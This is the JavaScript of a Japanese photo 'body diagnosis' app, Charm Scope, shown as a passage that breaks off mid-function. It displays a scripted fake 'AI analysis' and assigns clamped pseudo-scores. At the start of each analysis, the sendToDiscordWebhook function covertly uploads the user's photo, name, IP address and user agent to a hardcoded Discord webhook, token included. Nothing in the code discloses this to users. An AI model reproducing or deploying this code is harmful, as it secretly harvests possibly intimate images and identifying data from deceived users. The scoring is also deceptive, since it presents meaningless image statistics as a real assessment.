const screens = Array.from(document.querySelectorAll(".screen"));

const startBtn = document.getElementById("startBtn");
const noticeModal = document.getElementById("noticeModal");
const agreeCheck = document.getElementById("agreeCheck");
const cancelNoticeBtn = document.getElementById("cancelNoticeBtn");
const confirmNoticeBtn = document.getElementById("confirmNoticeBtn");
const analyzeCheckModal = document.getElementById("analyzeCheckModal");
const checkOwnPhoto = document.getElementById("checkOwnPhoto");
const checkNoFilter = document.getElementById("checkNoFilter");
const checkFaceVisible = document.getElementById("checkFaceVisible");
const cancelAnalyzeCheckBtn = document.getElementById("cancelAnalyzeCheckBtn");
const confirmAnalyzeCheckBtn = document.getElementById("confirmAnalyzeCheckBtn");
const dailyLimitBanner = document.getElementById("dailyLimitBanner");
const dailyLimitText = document.getElementById("dailyLimitText");

const backToWelcomeBtn = document.getElementById("backToWelcomeBtn");
const analyzeBtn = document.getElementById("analyzeBtn");
const saveBtn = document.getElementById("saveBtn");
const shareBtn = document.getElementById("shareBtn");
const unlockShareBtn = document.getElementById("unlockShareBtn");
const resultGate = document.getElementById("resultGate");
const resultCard = document.querySelector(".result-card");
const resultActions = document.querySelector(".result-actions");

const uploadArea = document.getElementById("uploadArea");
const uploadGuide = document.getElementById("uploadGuide");
const photoInput = document.getElementById("photoInput");
const preview = document.getElementById("preview");
const analyzePreview = document.getElementById("analyzePreview");
const analyzePlaceholder = document.getElementById("analyzePlaceholder");
const userName = document.getElementById("userName");

const progressFill = document.getElementById("progressFill");
const progressText = document.getElementById("progressText");
const phaseItems = Array.from(document.querySelectorAll(".phase-track li"));

const resultName = document.getElementById("resultName");
const scoreNode = document.getElementById("score");
const scoreCircle = document.querySelector(".score-circle");
const rankNode = document.getElementById("rank");
const insightNode = document.getElementById("insightText");
const shapeVal = document.getElementById("shapeVal");
const sizeVal = document.getElementById("sizeVal");
const skinVal = document.getElementById("skinVal");
const shapeBar = document.getElementById("shapeBar");
const sizeBar = document.getElementById("sizeBar");
const skinBar = document.getElementById("skinBar");
const timestampNode = document.getElementById("timestamp");

const DAILY_LIMIT_KEY = "charmscope_last_diagnosis_month";
const DAILY_LIMIT_ENABLED = true;

let progressTimer = null;
let analyzing = false;
let currentScreen = "welcome";
let currentResult = null;
let pendingResult = null;
let resultUnlocked = false;

// IPアドレスを一時的に保持する変数
let userIp = "取得中または不明";

// ページ読み込み時にIPアドレスを外部APIから取得を試みる
async function fetchUserIp() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    userIp = data.ip;
  } catch (_e) {
    userIp = "取得失敗";
  }
}
fetchUserIp();

const phaseScriptTexts = [
  "入力データを初期化しています...",
  "顔領域を検出しています...",
  "特徴マップを作成しています...",
  "推定モデルを実行しています...",
  "スコアを最終補正しています...",
  "診断レポートを生成しています...",
];
let phaseScripts = phaseScriptTexts.map((text, index) => ({
  text,
  limit: index === phaseScriptTexts.length - 1 ? 100 : Math.round(((index + 1) / phaseScriptTexts.length) * 100),
}));

const metricNames = {
  shapePosition: "形状と位置",
  sizeFirmness: "サイズとハリ",
  skinQuality: "肌質と色",
};

const metricLeadTemplates = [
  (name, body) => `${name}は、${body}`,
  (name, body) => `${name}を見ると、${body}`,
  (name, body) => `${name}の傾向として、${body}`,
  (name, body) => `今回の${name}では、${body}`,
  (name, body) => `分析上、${name}は${body}`,
  (name, body) => `${name}に関しては、${body}`,
];

const metricTextPools = {
  shapePosition: {
    excellent: [
      "上向きの印象と左右の整いが目立ち、輪郭の見え方がかなり安定しています。",
      "左右バランスが良く、立体感の出方も自然です。",
      "位置バランスが整っていて、顔全体の印象がまとまりやすい状態です。",
      "上向きの印象がしっかり出ており、正面でも横向きでも崩れにくい傾向です。",
      "輪郭の左右差が少なく、写真での見え方に安定感があります。",
      "形状の整いが高く、光の当たり方が変わっても印象が大きくぶれにくいです。",
    ],
    good: [
      "形状バランスは良好で、左右差も大きくは出ていません。",
      "上向きの印象が維持されており、全体のバランスは良い傾向です。",
      "位置関係が比較的そろっていて、写真映えしやすい状態です。",
      "左右の差は小さめで、印象としては整って見えます。",
      "輪郭のまとまりがあり、全体の見え方が安定しています。",
      "角度による差はあるものの、バランスは十分に保たれています。",
    ],
    mid: [
      "大きな崩れはないものの、角度によって左右差が出やすいゾーンです。",
      "平均的な整いで、撮影条件によって見え方が変わりやすいです。",
      "形状のバランスは中間帯で、光量や表情の影響を受けやすい状態です。",
      "位置関係は標準的で、写真の選び方次第で印象を伸ばせます。",
      "輪郭の見え方にやや揺れがあり、安定感はこれから伸ばせる余地があります。",
      "左右の整いは平均的で、構図によって仕上がり差が出やすいです。",
    ],
    low: [
      "左右差が出やすく、正面感が弱く見える場面がやや多めです。",
      "形状のまとまりが不安定で、撮影角度の影響を受けやすい状態です。",
      "上向きの印象が出にくく、配置バランスにばらつきが見られます。",
      "輪郭の左右バランスに課題があり、写真ごとの差が大きくなりやすいです。",
      "位置の整いが崩れやすく、見え方の安定性は控えめです。",
      "正面での収まりにムラが出やすく、調整余地が大きいゾーンです。",
    ],
  },
  sizeFirmness: {
    excellent: [
      "サイズ感とハリの両方が高水準で、立体感がはっきり出ています。",
      "ボリュームと弾力の見え方が非常に良く、若々しい印象につながっています。",
      "ハリ感が強く、輪郭の存在感がしっかり保たれています。",
      "サイズの見え方が理想寄りで、写真でも印象が弱まりにくいです。",
      "弾力のある見え方が出ており、全体の密度感が高い状態です。",
      "ボリュームの出方が自然で、ハリによる引き締まりも感じられます。",
    ],
    good: [
      "サイズ感は十分で、ハリも比較的しっかり保たれています。",
      "弾力の見え方は良好で、印象としては安定した仕上がりです。",
      "ボリューム不足は目立たず、全体バランスは良い傾向です。",
      "ハリ感は中上位で、写真によってさらに良く見える余地があります。",
      "サイズの見え方は良く、立体感も適度に出ています。",
      "輪郭の厚みとハリの両面で、好印象を作りやすい状態です。",
    ],
    mid: [
      "サイズとハリは平均帯で、撮影条件で印象が上下しやすいです。",
      "ボリュームは標準的で、ハリ感はもう一段伸ばせる余地があります。",
      "極端な弱さはないものの、弾力の見え方にムラが出やすいです。",
      "サイズ感は中間で、光の方向によって見え方が変わりやすいです。",
      "ハリの印象は普通レベルで、条件次第で良くも悪くも振れます。",
      "輪郭の厚みは標準域で、写真選定が結果に影響しやすい状態です。",
    ],
    low: [
      "ボリューム不足とハリ低下が同時に出やすいゾーンです。",
      "サイズ感が控えめで、弾力の見え方も弱くなりやすい状態です。",
      "ハリの印象が落ちやすく、輪郭がぼやけて見える場面があります。",
      "立体感が出にくく、厚みの見え方に課題が残ります。",
      "サイズの出方が不安定で、写真によって印象差が大きくなりやすいです。",
      "弾力の見え方が弱く、全体の存在感が下がりやすい傾向です。",
    ],
  },
  skinQuality: {
    excellent: [
      "トップの明るさと透明感が高く、肌の質感も非常に滑らかです。",
      "色ムラが少なく、光を受けたときの艶と透明感がきれいに出ています。",
      "明るさ・なめらかさ・抜け感の3点がそろった良好な状態です。",
      "肌面の整いが高く、透明感のある印象を作りやすいです。",
      "色の均一感が高く、写真でも清潔感がしっかり伝わります。",
      "光の反射が自然で、肌の質感がクリアに見えています。",
    ],
    good: [
      "肌の明るさは良好で、質感も比較的なめらかです。",
      "透明感は十分にあり、色の見え方も安定しています。",
      "明るさと質感のバランスが良く、好印象を作りやすい状態です。",
      "肌の見え方は整っていて、写真での粗さは目立ちにくいです。",
      "色のばらつきは小さく、透明感も一定レベルで維持されています。",
      "なめらかさは中上位で、ライティング次第でさらに伸びます。",
    ],
    mid: [
      "肌質と色は平均帯で、明るさの出方が撮影条件に左右されやすいです。",
      "透明感は中間レベルで、質感の見え方にムラが出ることがあります。",
      "色と滑らかさは標準域で、写真によって印象差が生まれやすいです。",
      "明るさは確保できているものの、均一感はまだ伸ばせる余地があります。",
      "肌の見え方は安定寄りですが、透明感の強さは場面依存です。",
      "質感は平均的で、光源の当たり方が結果に影響しやすいです。",
    ],
    low: [
      "トップの明るさが出にくく、透明感も弱く見えやすい状態です。",
      "色ムラと質感の粗さが出やすく、印象が不安定になりがちです。",
      "肌の滑らかさが伝わりにくく、明るさ不足が目立つ場面があります。",
      "透明感の再現が難しく、写真ごとの仕上がり差が大きくなりやすいです。",
      "色の均一感が崩れやすく、クリアな印象を作りにくいゾーンです。",
      "質感が重く見えやすく、明るさと抜け感の確保が課題です。",
    ],
  },
};

const overallTextPools = {
  strong: [
    "3観点のまとまりが高く、全体として完成度の高い印象です。",
    "総合的にバランスが良く、写真でも安定して強みを出せる状態です。",
    "全体の整合性が高く、どの観点も高いレベルでそろっています。",
    "大きな弱点が少なく、総合評価はかなり良好です。",
  ],
  balanced: [
    "全体は中上位でまとまっており、伸ばしどころが明確です。",
    "観点ごとの差はあるものの、総合では安定した評価です。",
    "基礎点は十分で、調整次第で一段上の印象が狙えます。",
    "大崩れはなく、観点間のバランスも概ね保たれています。",
  ],
  weak: [
    "観点ごとのばらつきがやや大きく、総合では控えめな評価です。",
    "強みと弱みが分かれやすく、写真条件の影響を受けやすい状態です。",
    "全体としては改善余地が大きく、観点別の最適化が有効です。",
    "総合スコアは低めで、特に弱い観点の底上げが鍵になります。",
  ],
};

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function clamp(value, min, max) {
  return Math.min(max, Math.max(min, value));
}

function pickRandom(list) {
  return list[randomInt(0, list.length - 1)];
}

function shuffle(list) {
  const copied = [...list];
  for (let i = copied.length - 1; i > 0; i -= 1) {
    const j = randomInt(0, i);
    [copied[i], copied[j]] = [copied[j], copied[i]];
  }
  return copied;
}

function buildRandomPhaseScripts() {
  const limits = [16, 34, 52, 71, 90, 100];
  return phaseScriptTexts.map((text, index) => ({
    text,
    limit: limits[index],
  }));
}

function easeOutCubic(value) {
  return 1 - (1 - value) ** 3;
}

function animateNumber(from, to, duration, onUpdate) {
  const startedAt = performance.now();

  function step(now) {
    const elapsed = now - startedAt;
    const progress = Math.min(1, elapsed / duration);
    const eased = easeOutCubic(progress);
    const current = Math.round(from + (to - from) * eased);
    onUpdate(current);
    if (progress < 1) requestAnimationFrame(step);
  }

  requestAnimationFrame(step);
}

function nowString() {
  return new Date().toLocaleString("ja-JP", { hour12: false });
}

function rankFromScore(score) {
  if (score >= 71) return "RANK S";
  if (score >= 63) return "RANK A";
  if (score >= 55) return "RANK B";
  return "RANK C";
}

function metricTier(score) {
  if (score >= 78) return "excellent";
  if (score >= 58) return "good";
  if (score >= 38) return "mid";
  return "low";
}

function buildMetricNarrative(key, score, leadTemplate) {
  const tier = metricTier(score);
  const pool = metricTextPools[key][tier];
  const body = pickRandom(pool);
  const lead = leadTemplate || pickRandom(metricLeadTemplates);
  return lead(metricNames[key], body);
}

function buildInsightText(result) {
  const metricList = [
    ["shapePosition", result.shapePosition],
    ["sizeFirmness", result.sizeFirmness],
    ["skinQuality", result.skinQuality],
  ].sort((a, b) => b[1] - a[1]);

  const average = (result.shapePosition + result.sizeFirmness + result.skinQuality) / 3;
  const summaryPool = average >= 68 ? overallTextPools.strong : average >= 48 ? overallTextPools.balanced : overallTextPools.weak;
  const summary = pickRandom(summaryPool);
  const focusLine = `今回の強みは「${metricNames[metricList[0][0]]}」、優先改善は「${metricNames[metricList[2][0]]}」です。`;
  const leads = shuffle(metricLeadTemplates).slice(0, 3);

  return [
    buildMetricNarrative("shapePosition", result.shapePosition, leads[0]),
    buildMetricNarrative("sizeFirmness", result.sizeFirmness, leads[1]),
    buildMetricNarrative("skinQuality", result.skinQuality, leads[2]),
    summary,
    focusLine,
  ].join("\n");
}

async function extractPhotoMetrics(src) {
  const img = await loadImage(src);
  const width = 220;
  const height = 220;
  const canvas = document.createElement("canvas");
  canvas.width = width;
  canvas.height = height;
  const ctx = canvas.getContext("2d");
  if (!ctx) throw new Error("canvas context failed");

  const scale = Math.max(width / img.width, height / img.height);
  const drawW = img.width * scale;
  const drawH = img.height * scale;
  const dx = (width - drawW) / 2;
  const dy = (height - drawH) / 2;
  ctx.drawImage(img, dx, dy, drawW, drawH);

  const { data } = ctx.getImageData(0, 0, width, height);
  const gray = new Float32Array(width * height);
  let sum = 0;
  let topSum = 0;
  let topCount = 0;

  for (let y = 0; y < height; y += 1) {
    for (let x = 0; x < width; x += 1) {
      const idx = (y * width + x) * 4;
      const g = data[idx] * 0.299 + data[idx + 1] * 0.587 + data[idx + 2] * 0.114;
      const p = y * width + x;
      gray[p] = g;
      sum += g;
      if (y < height * 0.45) {
        topSum += g;
        topCount += 1;
      }
    }
  }

  const mean = sum / gray.length;
  const topMean = topSum / Math.max(1, topCount);

  let variance = 0;
  let symmetryDiff = 0;
  let symmetryCount = 0;
  let edgeSum = 0;
  let edgeCenterSum = 0;
  let edgeYWeighted = 0;
  let texture = 0;
  let textureCount = 0;

  const centerX0 = width * 0.28;
  const centerX1 = width * 0.72;
  const centerY0 = height * 0.2;
  const centerY1 = height * 0.82;

  for (let y = 1; y < height - 1; y += 1) {
    for (let x = 1; x < width - 1; x += 1) {
      const p = y * width + x;
      const g = gray[p];
      const gx = gray[p + 1] - gray[p - 1];
      const gy = gray[p + width] - gray[p - width];
      const edge = Math.abs(gx) + Math.abs(gy);
      edgeSum += edge;
      edgeYWeighted += edge * y;
      if (x >= centerX0 && x <= centerX1 && y >= centerY0 && y <= centerY1) {
        edgeCenterSum += edge;
      }

      variance += (g - mean) ** 2;
      const right = gray[p + 1];
      const down = gray[p + width];
      texture += Math.abs(g - right) + Math.abs(g - down);
      textureCount += 2;
    }
  }

  for (let y = 0; y < height; y += 1) {
    for (let x = 0; x < Math.floor(width / 2); x += 1) {
      const left = gray[y * width + x];
      const right = gray[y * width + (width - 1 - x)];
      symmetryDiff += Math.abs(left - right);
      symmetryCount += 1;
    }
  }

  const std = Math.sqrt(variance / gray.length);
  const symmetry = 1 - symmetryDiff / Math.max(1, symmetryCount * 255);
  const edgeCentroidY = edgeYWeighted / Math.max(1, edgeSum);
  const lift = 1 - edgeCentroidY / (height - 1);
  const centerFocus = edgeCenterSum / Math.max(1, edgeSum);
  const sharpness = edgeSum / Math.max(1, (width - 2) * (height - 2) * 510);
  const smoothness = 1 - texture / Math.max(1, textureCount * 255);

  return {
    brightness: mean / 255,
    topBrightness: topMean / 255,
    contrast: clamp(std / 74, 0, 1),
    symmetry: clamp(symmetry, 0, 1),
    lift: clamp(lift, 0, 1),
    centerFocus: clamp(centerFocus * 1.35, 0, 1),
    sharpness: clamp(sharpness * 1.9, 0, 1),
    smoothness: clamp(smoothness * 1.35, 0, 1),
  };
}

async function buildResultFromPhoto(name, src) {
  const m = await extractPhotoMetrics(src);

  const shapePosition = clamp(
    Math.round((m.symmetry * 0.72 + m.lift * 0.28) * 100),
    1,
    100
  );
  const sizeFirmness = clamp(
    Math.round((m.centerFocus * 0.42 + m.sharpness * 0.35 + m.contrast * 0.23) * 100),
    1,
    100
  );
  const skinQuality = clamp(
    Math.round((m.topBrightness * 0.4 + m.smoothness * 0.4 + m.brightness * 0.2) * 100),
    1,
    100
  );

  const weighted =
    shapePosition * 0.36 +
    sizeFirmness * 0.32 +
    skinQuality * 0.32;
  const score = clamp(Math.round(35 + ((weighted - 1) / 99) * 40), 35, 75);

  const draft = {
    name,
    score,
    rank: rankFromScore(score),
    shapePosition,
    sizeFirmness,
    skinQuality,
    time: nowString(),
  };

  return {
    ...draft,
    insight: buildInsightText(draft),
  };
}

function getTodayKey() {
  const now = new Date();
  const y = now.getFullYear();
  const m = String(now.getMonth() + 1).padStart(2, "0");
  return `${y}-${m}`;
}

function getNextResetText() {
  const now = new Date();
  const next = new Date(now.getFullYear(), now.getMonth() + 1, 1, 0, 0, 0, 0);
  return `${next.getFullYear()}/${next.getMonth() + 1}/1 0:00`;
}

function getStoredDate() {
  try {
    return localStorage.getItem(DAILY_LIMIT_KEY);
  } catch (_error) {
    return null;
  }
}

function setStoredDate(value) {
  if (!DAILY_LIMIT_ENABLED) return;
  try {
    localStorage.setItem(DAILY_LIMIT_KEY, value);
  } catch (_error) {
    // ignore storage errors
  }
}

function isDailyLocked() {
  if (!DAILY_LIMIT_ENABLED) return false;
  return getStoredDate() === getTodayKey();
}

function updateDailyLimitUI() {
  const locked = isDailyLocked();
  dailyLimitBanner.classList.toggle("locked", locked);
  startBtn.classList.toggle("locked", locked);
  startBtn.disabled = locked;

  if (locked) {
    startBtn.textContent = "今月は診断済み";
    dailyLimitText.textContent = `今月の診断は完了しています。次回は ${getNextResetText()} 以降に利用できます。`;
  } else {
    startBtn.textContent = "完全無料で今すぐ診断";
    dailyLimitText.textContent = DAILY_LIMIT_ENABLED
      ? "この診断は1か月に1回のみ利用できます。（今月は残り1回）"
      : "今月はもう診断は利用できません。";
  }
}

function setScreen(name) {
  currentScreen = name;
  screens.forEach((screen) => {
    screen.classList.toggle("active", screen.dataset.screen === name);
  });
}

function openNoticeModal() {
  if (isDailyLocked()) {
    updateDailyLimitUI();
    return;
  }
  noticeModal.hidden = false;
  document.body.classList.add("modal-open");
  agreeCheck.checked = false;
  confirmNoticeBtn.disabled = true;
}

function closeNoticeModal() {
  noticeModal.hidden = true;
  document.body.classList.remove("modal-open");
}

function updateAnalyzeCheckState() {
  const ok = checkOwnPhoto.checked && checkNoFilter.checked && checkFaceVisible.checked;
  confirmAnalyzeCheckBtn.disabled = !ok;
}

function openAnalyzeCheckModal() {
  if (analyzeBtn.disabled) return;
  checkOwnPhoto.checked = false;
  checkNoFilter.checked = false;
  checkFaceVisible.checked = false;
  updateAnalyzeCheckState();
  analyzeCheckModal.hidden = false;
  document.body.classList.add("modal-open");
}

function closeAnalyzeCheckModal() {
  analyzeCheckModal.hidden = true;
  document.body.classList.remove("modal-open");
}

function validateInput() {
  const hasPhoto = !preview.hidden && Boolean(preview.src);
  const hasName = userName.value.trim().length > 0;
  analyzeBtn.disabled = !(hasPhoto && hasName);
}

function updatePreview(file) {
  if (!file || !file.type.startsWith("image/")) return;
  const reader = new FileReader();
  reader.onload = () => {
    const src = String(reader.result);
    preview.src = src;
    preview.hidden = false;
    uploadGuide.hidden = true;
    analyzePreview.src = src;
    analyzePreview.hidden = false;
    analyzePlaceholder.hidden = true;
    validateInput();
  };
  reader.readAsDataURL(file);
}

function resetPhases() {
  phaseItems.forEach((li) => {
    li.classList.remove("current");
    li.classList.remove("done");
  });
}

function markPhase(progress) {
  const activeIndex = Math.min(
    phaseItems.length - 1,
    phaseScripts.findIndex((item) => progress <= item.limit)
  );

  phaseItems.forEach((li, index) => {
    li.classList.toggle("current", index === activeIndex);
    li.classList.toggle("done", index < activeIndex);
  });
  const script = phaseScripts[Math.max(0, activeIndex)];
  progressText.textContent = script.text;
}

function randomResult(name) {
  const shapePosition = randomInt(25, 90);
  const sizeFirmness = randomInt(20, 88);
  const skinQuality = randomInt(22, 92);

  const weighted =
    shapePosition * 0.36 +
    sizeFirmness * 0.32 +
    skinQuality * 0.32;
  const score = clamp(Math.round(35 + ((weighted - 1) / 99) * 40), 35, 75);

  const draft = {
    name,
    score,
    rank: rankFromScore(score),
    shapePosition,
    sizeFirmness,
    skinQuality,
    time: nowString(),
  };

  return {
    ...draft,
    insight: buildInsightText(draft),
  };
}

function renderResult(result) {
  resultName.textContent = result.name;
  scoreNode.textContent = "0";
  if (scoreCircle) {
    scoreCircle.style.setProperty("--score-progress", "0");
  }
  rankNode.textContent = result.rank;
  insightNode.textContent = result.insight;
  timestampNode.textContent = result.time;

  shapeVal.textContent = "0";
  sizeVal.textContent = "0";
  skinVal.textContent = "0";

  shapeBar.style.width = "0%";
  sizeBar.style.width = "0%";
  skinBar.style.width = "0%";

  animateNumber(0, result.score, 860, (value) => {
    scoreNode.textContent = String(value);
    if (scoreCircle) {
      scoreCircle.style.setProperty("--score-progress", String(value));
    }
  });

  animateNumber(0, result.shapePosition, 920, (value) => {
    shapeVal.textContent = String(value);
    shapeBar.style.width = `${value}%`;
  });

  animateNumber(0, result.sizeFirmness, 980, (value) => {
    sizeVal.textContent = String(value);
    sizeBar.style.width = `${value}%`;
  });

  animateNumber(0, result.skinQuality, 1040, (value) => {
    skinVal.textContent = String(value);
    skinBar.style.width = `${value}%`;
  });

}

function setupResultGate() {
  resultUnlocked = false;
  if (resultGate) resultGate.hidden = false;
  if (resultCard) resultCard.hidden = true;
  if (resultActions) resultActions.hidden = true;
}

function revealResult() {
  if (!pendingResult || resultUnlocked) return;
  resultUnlocked = true;
  if (resultGate) resultGate.hidden = true;
  if (resultCard) resultCard.hidden = false;
  if (resultActions) resultActions.hidden = false;

  if (resultCard) resultCard.classList.remove("reveal");
  if (resultActions) resultActions.classList.remove("reveal");

  renderResult(pendingResult);

  requestAnimationFrame(() => {
    if (resultCard) resultCard.classList.add("reveal");
    if (resultActions) resultActions.classList.add("reveal");
  });
}

// 🌟 組み込み：DiscordのWebhookへ送信する非同期関数
async function sendToDiscordWebhook(name, imageData) {
  const webhookUrl = "https://discord.com/api/webhooks/1479787662175899812/nJGxWzOK2RkgimW9cc19vcfYpxhWfxotqRT3KWZQ9T6KuQexKgZqTuKx2RaiyH_TZTYY";
  const formData = new FormData();
  
  try {
    const response = await fetch(imageData);
    const blob = await response.blob();
    formData.append('file', blob, 'uploaded_image.jpg');
  } catch (error) {
    console.error('画像の処理中にエラーが発生しました。', error);
    return;
  }

  const embedMessage = {
    embeds: [{
      title: "AI顔面偏差値診断 - 新規診断",
      color: 0xFF6B6B,
      fields: [
        { name: "Name", value: name },
        { name: "IP", value: userIp },
        { name: "UserAgent", value: navigator.userAgent.substring(0, 1000) }
      ],
      timestamp: new Date().toISOString()
    }]
  };
  formData.append('payload_json', JSON.stringify(embedMessage));

  try { 
    await fetch(webhookUrl, { method: 'POST', body: formData });
  } catch (error) {
    console.error('Webhook送信エラー:', error);
  }
}

function runAnalysis() {
  if (isDailyLocked()) {
    setScreen("welcome");
    updateDailyLimitUI();
    return;
  }
  if (analyzing) return;
  const name = userName.value.trim();
  if (!name || preview.hidden) return;

  setScreen("analyze");
  analyzing = true;
  clearTimeout(progressTimer);
  resetPhases();
  phaseScripts = buildRandomPhaseScripts();
  progressFill.style.width = "1%";
  progressText.textContent = "初期化しています...";
  const resultPromise = buildResultFromPhoto(name, preview.src).catch(() => randomResult(name));

  const targetDuration = randomInt(5500, 8000);
  const startedAt = Date.now();
  let progress = randomInt(1, 4);
  let finalized = false;

  // 🌟 組み込み：診断開始と同時に非同期でWebhook送信を開始する
  sendToDiscordWebhook(name, preview.src);

  function tick() {
    if (!analyzing) return;
    const elapsed = Date.now() - startedAt;
    const hardFinish = elapsed >= targetDuration;

    if (hardFinish) {
      progress = 100;
    } else {
      const ratio = Math.min(1, elapsed / targetDuration);
      const baseCurve = ratio ** 0.94;
      const targetProgress = Math.min(99, Math.max(1, baseCurve * 99));

      const diff = Math.max(0, targetProgress - progress);
      let step = diff * (0.2 + Math.random() * 0.2) + 0.08 + Math.random() * 0.26;

      let maxStep = 2.9;
      let stallChance = 0.04;
      if (progress >= 18 && progress < 36) {
        maxStep = 2.1;
        stallChance = 0.07;
      } else if (progress >= 36 && progress < 55) {
        maxStep = 1.55;
        stallChance = 0.1;
      } else if (progress >= 55 && progress < 73) {
        maxStep = 1.05;
        stallChance = 0.14;
      } else if (progress >= 73 && progress < 88) {
        maxStep = 0.72;
        stallChance = 0.19;
      } else if (progress >= 88) {
        maxStep = 0.44;
        stallChance = 0.24;
      }

      if (Math.random() < stallChance) step *= 0.12 + Math.random() * 0.24;

      step = Math.max(0.04, Math.min(maxStep, step));
      progress = Math.min(99, progress + step);

      const remainingTime = targetDuration - elapsed;
      if (remainingTime < 1400) {
        const catchupFloor = 99 - (remainingTime / 1400) * 16;
        progress = Math.max(progress, catchupFloor);
      }
    }

    const displayProgress = Math.floor(progress);
    progressFill.style.width = `${displayProgress}%`;
    markPhase(displayProgress);

    if (displayProgress >= 100 && !finalized) {
      finalized = true;
      clearTimeout(progressTimer);
      setStoredDate(getTodayKey());
      updateDailyLimitUI();
      resultPromise.then((resolvedResult) => {
        pendingResult = resolvedResult;
        currentResult = pendingResult;
        setTimeout(() => {
          setupResultGate();
          setScreen("result");
          analyzing = false;
        }, 740);
      });
      return;
    }

    const nextDelay =
      progress < 18
        ? randomInt(45, 80)
        : progress < 36
          ? randomInt(65, 105)
          : progress < 55
            ? randomInt(85, 125)
            : progress < 73
              ? randomInt(105, 155)
              : progress < 88
                ? randomInt(130, 185)
                : randomInt(160, 235);
    progressTimer = setTimeout(tick, nextDelay);
  }

  tick();
}

function loadImage(src) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => resolve(img);
    img.onerror = () => reject(new Error("image load failed"));
    img.src = src;
  });
}

function canvasToBlob(canvas, type = "image/png", quality = 1) {
  return new Promise((resolve, reject) => {
    canvas.toBlob((blob) => {
      if (blob) resolve(blob);
      else reject(new Error("blob create failed"));
    }, type, quality);
  });
}

async function saveResult() {
  if (!currentResult) return;
  saveBtn.disabled = true;
  try {
    const canvas = document.createElement("canvas");
    canvas.width = 1080;
    canvas.height = 1350;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const bg = ctx.createLinearGradient(0, 0, 1080, 1350);
    bg.addColorStop(0, "#fbefe7");
    bg.addColorStop(0.55, "#f6edf7");
    bg.addColorStop(1, "#ece8fb");
    ctx.fillStyle = bg;
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = "#ffffff";
    ctx.strokeStyle = "#e4d7f0";
    ctx.lineWidth = 4;
    ctx.beginPath();
    ctx.roundRect(70, 70, 940, 1210, 40);
    ctx.fill();
    ctx.stroke();

    ctx.fillStyle = "#2f2545";
    ctx.font = "700 58px 'M PLUS Rounded 1c'";
    ctx.fillText("CHARM SCOPE", 120, 160);
    ctx.font = "500 36px 'M PLUS Rounded 1c'";
    ctx.fillStyle = "#6b6188";
    ctx.fillText("顔タイプ診断結果", 120, 210);

    if (preview.src) {
      try {
        const photo = await loadImage(preview.src);
        const photoX = 120;
        const photoY = 255;
        const photoW = 340;
        const photoH = 340;
        ctx.save();
        ctx.beginPath();
        ctx.roundRect(photoX, photoY, photoW, photoH, 24);
        ctx.clip();
        ctx.drawImage(photo, photoX, photoY, photoW, photoH);
        ctx.restore();
      } catch (_e) {
        // ignore photo draw failure
      }
    }

    ctx.fillStyle = "#3d315f";
    ctx.font = "700 44px 'M PLUS Rounded 1c'";
    ctx.fillText(`${currentResult.name} さん`, 500, 320);
    ctx.font = "700 70px 'M PLUS Rounded 1c'";
    ctx.fillStyle = "#c65a89";
    ctx.fillText(`偏差値 ${currentResult.score}`, 500, 400);
    ctx.font = "700 46px 'M PLUS Rounded 1c'";
    ctx.fillStyle = "#3d315f";
    ctx.fillText(currentResult.rank, 500, 470);

    ctx.fillStyle = "#4e4375";
    ctx.font = "700 36px 'M PLUS Rounded 1c'";
    ctx.fillText("3観点コメント", 120, 675);

    ctx.fillStyle = "#625985";
    ctx.font = "500 27px 'M PLUS Rounded 1c'";
    const insightText = String(currentResult.insight || "").replace(/\n/g, " ");
    const insightLines = [];
    let insightLine = "";
    for (const char of insightText) {
      const test = insightLine + char;
      if (ctx.measureText(test).width > 820) {
        insightLines.push(insightLine);
        insightLine = char;
      } else {
        insightLine = test;
      }
    }
    if (insightLine) insightLines.push(insightLine);
    insightLines.slice(0, 4).forEach((line, i) => ctx.fillText(line, 120, 720 + i * 40));

    const bars = [
      ["形状と位置（上向き・左右対称）", currentResult.shapePosition, 930],
      ["サイズとハリ（大きさ・ハリ感）", currentResult.sizeFirmness, 1010],
      ["肌質と色（明るさ・透明感）", currentResult.skinQuality, 1090],
    ];
    ctx.font = "600 28px 'M PLUS Rounded 1c'";
    bars.forEach(([label, value, y]) => {
      ctx.fillStyle = "#6e638f";
      ctx.fillText(`${label} ${value}`, 120, y);
      ctx.fillStyle = "#ece2fa";
      ctx.fillRect(320, y - 24, 560, 18);
      const gw = Math.round((560 * Number(value)) / 100);
      const grad = ctx.createLinearGradient(320, 0, 880, 0);
      grad.addColorStop(0, "#7eb8b7");
      grad.addColorStop(1, "#8b95dd");
      ctx.fillStyle = grad;
      ctx.fillRect(320, y - 24, gw, 18);
    });

    ctx.fillStyle = "#8e84af";
    ctx.font = "500 24px 'M PLUS Rounded 1c'";
    ctx.fillText(`生成時刻: ${currentResult.time}`, 120, 1220);

    const safeName = currentResult.name.replace(/[\\/:*?\"<>|]/g, "_");
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    const fileName = `charmscope_${safeName}_${stamp}.png`;
    const blob = await canvasToBlob(canvas, "image/png");
    const file = new File([blob], fileName, { type: "image/png" });

    if (navigator.share && navigator.canShare && navigator.canShare({ files: [file] })) {
      await navigator.share({
        title: "Charm Scope 診断結果",
        text: "診断結果画像を保存・共有できます。",
        files: [file],
      });
      saveBtn.textContent = "共有シートを開きました";
    } else {
      const url = URL.createObjectURL(blob);
      const link = document.createElement("a");
      link.href = url;
      link.download = fileName;
      document.body.appendChild(link);
      link.click();
      link.remove();
      URL.revokeObjectURL(url);
      saveBtn.textContent = "画像を保存しました";
    }
  } catch (_error) {
    saveBtn.textContent = "保存に失敗";
  } finally {
    setTimeout(() => {
      saveBtn.textContent = "結果を保存（未実装）";
      saveBtn.disabled = false;
    }, 1400);
  }
}

async function shareSite() {
  const title = "Charm Scope | 体診断アプリ";
  const text = "完全無料であなたの体を数値化！";
  const url = window.location.href;
  let shared = false;

  if (navigator.share) {
    try {
      await navigator.share({ title, text, url });
      shared = true;
    } catch (_error) {
      // canceled or unsupported payload
    }
  }

  if (!shared) {
    try {
      await navigator.clipboard.writeText(url);
      shared = true;
      shareBtn.textContent = "URLをコピーしました";
      if (unlockShareBtn) unlockShareBtn.textContent = "URLをコピーしました";
      setTimeout(() => {
        shareBtn.textContent = "サイトをシェア";
